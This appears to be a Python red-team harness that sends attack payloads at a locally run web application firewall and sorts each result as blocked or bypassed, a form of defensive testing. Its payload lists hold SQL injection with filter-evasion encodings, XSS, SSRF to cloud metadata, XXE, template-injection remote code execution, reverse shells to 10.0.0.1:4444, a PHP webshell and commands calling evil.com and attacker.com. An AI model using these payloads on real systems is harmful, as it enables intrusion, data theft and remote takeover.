#!/usr/bin/env python3
"""
jarsWAF Red Team — attack harness.
Sends payload waves against the WAF and classifies:
  BLOCKED  = WAF responded 4xx (403/429/400) -> detection works
  BYPASS   = backend echo reached (200 with 'backend') -> WAF FAILED to block
  WEIRD    = other status (500/000/timeout) -> investigate

Backend echo (127.0.0.1:8080) acts as ground truth: if the payload reached
it, the WAF was bypassed.
"""
import http.client
import json
import re
import sys
import time
import urllib.parse

WAF_HOST = "127.0.0.1"
WAF_PORT = 8000
VHOST = "test.jarswafwaf.demo"
BACKEND_MARKER = "backend"

CHROME_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
SEC_CH_UA = '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"'

BASE_HEADERS = {
    "Host": VHOST,
    "User-Agent": CHROME_UA,
    "Sec-CH-UA": SEC_CH_UA,
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
}

results = []
blocked_rules = {}


def req(method, path_query, body=None, headers=None, tag=""):
    """Return (status, rule_hint, reached_backend, body_text).
    Spaces and control chars in path/query are percent-encoded automatically."""
    hdrs = dict(BASE_HEADERS)
    if headers:
        hdrs.update(headers)
    # percent-encode raw spaces/control chars but keep existing %XX intact
    path_query = re.sub(r"[\x00-\x20\x7f]", lambda m: urllib.parse.quote(m.group(0)), path_query)
    try:
        conn = http.client.HTTPConnection(WAF_HOST, WAF_PORT, timeout=8)
        conn.request(method, path_query, body=body, headers=hdrs)
        resp = conn.getresponse()
        status = resp.status
        data = resp.read(2000).decode("utf-8", "replace")
        conn.close()
    except Exception as e:
        return ("ERR", str(e), False, "")
    reached = BACKEND_MARKER in data
    # extract rule id from jarsWAF 403 HTML (rule shown in title/body)
    m = re.search(r"([A-Z][A-Z0-9-]{2,20}-\d{3})", data)
    rule_hint = m.group(1) if m else ""
    return (status, rule_hint, reached, data)


def classify(status, rule_hint, reached):
    if reached:
        return "BYPASS"
    if status in (403, 429, 400, 401, 413):
        if rule_hint:
            blocked_rules[rule_hint] = blocked_rules.get(rule_hint, 0) + 1
        return "BLOCKED"
    return f"WEIRD({status})"


def run_wave(name, payloads, method="GET", body=False, headers=None):
    print(f"\n{'='*70}\nWAVE: {name} ({len(payloads)} payloads)\n{'='*70}")
    for p in payloads:
        if body:
            st, rh, reached, txt = req(method, "/api/search", body=p, headers=headers or {"Content-Type": "application/json"}, tag=name)
        else:
            st, rh, reached, txt = req(method, p, tag=name)
        verdict = classify(st, rh, reached)
        results.append((name, p[:90], verdict, st, rh))
        icon = "🟢 BYPASS" if verdict == "BYPASS" else ("🔴 BLOCK" if verdict == "BLOCKED" else "🟡 WEIRD")
        print(f"  {icon:16} {st} {rh:22} {p[:90]}")
    return


def enc(s):
    return urllib.parse.quote(s, safe="")


# ============================================================
# WAVE 1 — SQLi baseline (control group: should ALL be blocked)
# ============================================================
sqli_basic = [
    "/?id=1' OR '1'='1",
    "/?id=1 OR 1=1",
    "/?id=1' OR '1'='1'--",
    "/?id=1 UNION SELECT 1,2,3",
    "/?id=' UNION ALL SELECT username,password FROM users--",
    "/?id=1; DROP TABLE users--",
    "/?id=admin' AND '1'='1",
    "/?id=1'/*",
    "/?id=1'#",
    "/?id=1'--",
    "/?id=1' AND SLEEP(5)--",
    "/?id=1' OR pg_sleep(5)--",
]
run_wave("SQLi Baseline (control)", sqli_basic)

# ============================================================
# WAVE 2 — SQLi Encoding & Mutation
# ============================================================
sqli_encoded = [
    "/?id=1%27%20OR%20%271%27%3D%271",          # url-encoded quotes
    "/?id=1%2527%2520OR%2520%25271%2527%253D%25271",  # double url
    "/?id=1%u0027%20OR%201=1",                  # unicode quote
    "/?id=1%EF%BC%87%20OR%201=1",               # fullwidth quote
    "/?id=1%c0%a7%20OR%201=1",                  # overlong utf8
    "/?id=1'/**/OR/**/1=1",                     # comment-wrapped OR
    "/?id=1'%09OR%091=1",                       # tab whitespace
    "/?id=1'%0aOR%0a1=1",                       # newline whitespace
    "/?id=1'%0bOR%0b1=1",                       # vertical tab
    "/?id=1'%00OR%001=1",                       # null byte
    "/?id=1'%u004fR%u00201=1",                  # unicode O and space
    "/?id=1' OR '1'='1' %23",                   # hash comment end
    "/?id=1' or 1=1 /*",                        # unterminated block comment
    "/?id=1' UN/**/ION SEL/**/ECT 1,2,3",       # comment-split UNION SELECT
    "/?id=1'%2553ELECT%2520user",               # double-encoded SELECT
    "/?id=1'||'1'='1",                          # concat tautology
    "/?id=1'&&'1'='1",                          # concat and
]
run_wave("SQLi Encoding & Mutation", sqli_encoded)

# ============================================================
# WAVE 3 — XSS
# ============================================================
xss_payloads = [
    "/?q=<script>alert(1)</script>",
    "/?q=<svg onload=alert(1)>",
    "/?q=<img src=x onerror=alert(1)>",
    "/?q=javascript:alert(1)",
    "/?q=<iframe src=javascript:alert(1)>",
    "/?q=<body onload=alert(1)>",
    "/?q=<details open ontoggle=alert(1)>",
    "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",   # url encoded
    "/?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E",  # double url
    "/?q=%3Csvg%20onload%3Dalert(1)%3E",        # encoded svg
    "/?q=<scr<script>ipt>alert(1)</scr</script>ipt>",  # nested tag
    "/?q=<script>eval(atob('YWxlcnQoMSk='))</script>",  # base64 eval
    "/?q=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",  # html entity
    "/?q=<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>",  # data uri
    "/?q=<<script>alert(1)//<</script>",        # broken tag
    "/?q=</script><script>alert(1)</script>",   # closing tag breakout
]
run_wave("XSS", xss_payloads)

# ============================================================
# WAVE 4 — LFI / Path Traversal / SSRF / RFI
# ============================================================
lfi_payloads = [
    "/?file=../../../../etc/passwd",
    "/?file=..%2f..%2f..%2fetc%2fpasswd",
    "/?file=....//....//etc/passwd",
    "/?file=..%252f..%252fetc%252fpasswd",     # double url traversal
    "/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/?file=php://filter/convert.base64-encode/resource=index.php",
    "/?file=php://input",
    "/?file=/etc/passwd%00",
    "/?url=http://169.254.169.254/latest/meta-data/",
    "/?url=http://127.0.0.1:8080/admin",
    "/?url=http://2130706433/",                # decimal IP
    "/?url=http://0x7f000001/",                # hex IP
    "/?url=http://0177.0.0.1/",                # octal IP
    "/?url=http://[::ffff:127.0.0.1]/",        # IPv6-mapped
    "/?url=http://localhost/",
    "/?next=https://evil.com/steal",
    "/?redirect=https://evil.com",
    "/?file=https://evil.com/shell.php",
]
run_wave("LFI/Traversal/SSRF/RFI", lfi_payloads)

# ============================================================
# WAVE 5 — Command Injection
# ============================================================
cmdi_payloads = [
    "/?cmd=; whoami",
    "/?cmd=| whoami",
    "/?cmd=&& whoami",
    "/?cmd=`whoami`",
    "/?cmd=$(whoami)",
    "/?cmd=;cat /etc/passwd",
    "/?cmd=ping -c 1 127.0.0.1; curl http://evil.com/x",
    "/?cmd=wget http://burpcollaborator.net/x",
    "/?cmd=curl http://dnslog.cn",
    "/?cmd=nslookup attacker.com",
    "/?cmd=ls -la /etc",
]
run_wave("Command Injection", cmdi_payloads)

# ============================================================
# WAVE 6 — HTTP Level: HPP, smuggling, verb, headers
# ============================================================
hpp_payloads = [
    "/?id=1&id=2",                              # HPP duplicate param
    "/?id=1&id=UNION SELECT 1,2",               # HPP + SQLi
    "/?id=1&id=1' OR '1'='1",
    "/?q=<script>alert(1)</script>&q=hello",    # HPP XSS
]
run_wave("HTTP Parameter Pollution", hpp_payloads)

# Smuggling via raw headers
for label, hdrs in [
    ("CL+TE smuggling", {"Content-Length": "5", "Transfer-Encoding": "chunked", "Content-Type": "text/plain"}),
    ("TE obfuscated", {"Transfer-Encoding": "Chunked", "Content-Type": "text/plain"}),
    ("TE double", {"Transfer-Encoding": "chunked, chunked", "Content-Type": "text/plain"}),
    (":authority pseudo-header", {":authority": "evil.com", "Content-Type": "text/plain"}),
    ("X-Forwarded-For spoof", {"X-Forwarded-For": "10.0.0.1", "Content-Type": "text/plain"}),
    ("proxy headers", {"Via": "1.1 proxy", "X-Proxy-Id": "1", "Content-Type": "text/plain"}),
]:
    st, rh, reached, txt = req("POST", "/submit", body="x" * 20, headers=hdrs, tag=label)
    verdict = classify(st, rh, reached)
    results.append((f"HTTP-level: {label}", "", verdict, st, rh))
    icon = "🟢 BYPASS" if verdict == "BYPASS" else ("🔴 BLOCK" if verdict == "BLOCKED" else "🟡 WEIRD")
    print(f"  {icon:16} {st} {rh:22} {label}")

# ============================================================
# WAVE 7 — Body-based: POST JSON with payloads, SSTI, XXE, upload
# ============================================================
body_payloads = [
    ('{"q": "1\' OR \'1\'=\'1"}', "json sqli"),
    ('{"q": "1 UNION SELECT 1,2,3"}', "json union"),
    ('{"q": "<script>alert(1)</script>"}', "json xss"),
    ('{"user": "{{7*7}}"}', "ssti jinja"),
    ('{"user": "${7*7}"}', "ssti dollar"),
    ('{"user": "<%= 7*7 %>"}', "ssti erb"),
    (r'{"user": "{{config.__class__.__init__.__globals__['"'"'os'"'"'].popen('"'"'id'"'"').read()}}"}', "ssti rce"),
    (r'{"xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}', "xxe classic"),
    (r'{"xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe\">%xxe;]><foo/>"}', "xxe blind param"),
    (r'{"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}', "revshell bash"),
    (r'{"cmd": "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\'"}', "revshell python"),
    (r'{"cmd": "php -r \'$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'"}', "revshell php"),
    (r'{"file": "shell.php"}', "webshell ext"),
    (r'{"code": "<?php echo shell_exec($_GET[\'cmd\']); ?>"}', "webshell php code"),
    (r'{"data": "echo bHMgLWxh | base64 -d | sh"}', "obfuscated cmd"),
]
print(f"\n{'='*70}\nWAVE: Body-based (JSON) ({len(body_payloads)} payloads)\n{'='*70}")
for payload, label in body_payloads:
    st, rh, reached, txt = req("POST", "/api/search", body=payload, headers={"Content-Type": "application/json"}, tag=label)
    verdict = classify(st, rh, reached)
    results.append((f"Body: {label}", payload[:90], verdict, st, rh))
    icon = "🟢 BYPASS" if verdict == "BYPASS" else ("🔴 BLOCK" if verdict == "BLOCKED" else "🟡 WEIRD")
    print(f"  {icon:16} {st} {rh:22} {label}")

# ============================================================
# WAVE 8 — Exotic / Logic-level bypasses
# ============================================================
exotic_payloads = [
    "/?id=1' OR '1'='1' OR 'x'='x",
    "/?id=(1)OR(1)=(1)",                         # no spaces
    "/?id=1'OR'1'='1",                           # no spaces around OR
    "/?id=1' or 1 in (select 1) --",
    "/?id=1' or 1 like 1 --",
    "/?id=1' or 1 between 0 and 2 --",
    "/?id=1' or row(1,1)>(0,0) --",
    "/?id=1' collate nocase = '1' --",
    "/?id=1' union select 1,2,3 from (select 1) as t --",
    "/?id=%27%20%4f%52%20%271%27%3d%271",        # OR hex-encoded
    "/?id=1' %26%26 '1'='1",                     # && encoded
    "/?id=1' || '1'='1",                         # || concat
    "/?id=1' xor '1'='1",
    "/?id=1'; SELECT pg_sleep(10); --",
    "/?id=1' + '1' = '1",                        # + concat in mysql
    "/?id=1' union select null,null,null#",
    "/?id=1' union select 1,@@version,3#",       # mysql version
]
run_wave("Exotic SQLi / Logic", exotic_payloads)

# ============================================================
# WAVE 9 — Canary & allowed passthrough (must NOT be blocked)
# ============================================================
canary_payloads = [
    "/canary/abc-123-token",
    "/nest/xyz",
    "/?q=canarytoken.abc123.dnslog.cn",
    "/?q=oastify.com",
]
print(f"\n{'='*70}\nWAVE: Canary Tokens (must PASS through)\n{'='*70}")
for p in canary_payloads:
    st, rh, reached, txt = req("GET", p)
    verdict = classify(st, rh, reached)
    # canary reaching backend = GOOD (tripwire fired)
    label = "PASS-OK" if reached else ("BLOCKED-BAD" if verdict == "BLOCKED" else verdict)
    results.append((f"Canary: {p}", "", label, st, rh))
    print(f"  {'🟢 ' + label if label == 'PASS-OK' else '🔴 ' + label:20} {st} {rh} {p}")

# ============================================================
# Summary
# ============================================================
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
total = len(results)
bypasses = [r for r in results if r[2] == "BYPASS"]
blocks = [r for r in results if r[2] == "BLOCKED"]
weirds = [r for r in results if r[2].startswith("WEIRD") or r[2] == "ERR"]
print(f"Total payloads : {total}")
print(f"BLOCKED        : {len(blocks)}  ({100*len(blocks)//max(total,1)}%)")
print(f"BYPASS         : {len(bypasses)}  ({100*len(bypasses)//max(total,1)}%)")
print(f"WEIRD/ERR      : {len(weirds)}")

if bypasses:
    print("\n--- BYPASSES (WAF FAILED) ---")
    for name, p, v, st, rh in bypasses:
        print(f"  [BYPASS] {st} {name}: {p}")
if weirds:
    print("\n--- WEIRD ---")
    for name, p, v, st, rh in weirds:
        print(f"  [WEIRD] {st} {name}: {p}")

print("\n--- Rules that blocked (top) ---")
for rule, cnt in sorted(blocked_rules.items(), key=lambda x: -x[1])[:15]:
    print(f"  {rule:24} {cnt}x")

json.dump(results, open("/tmp/redteam-results.json", "w"), indent=1)
print("\nResults saved to /tmp/redteam-results.json")
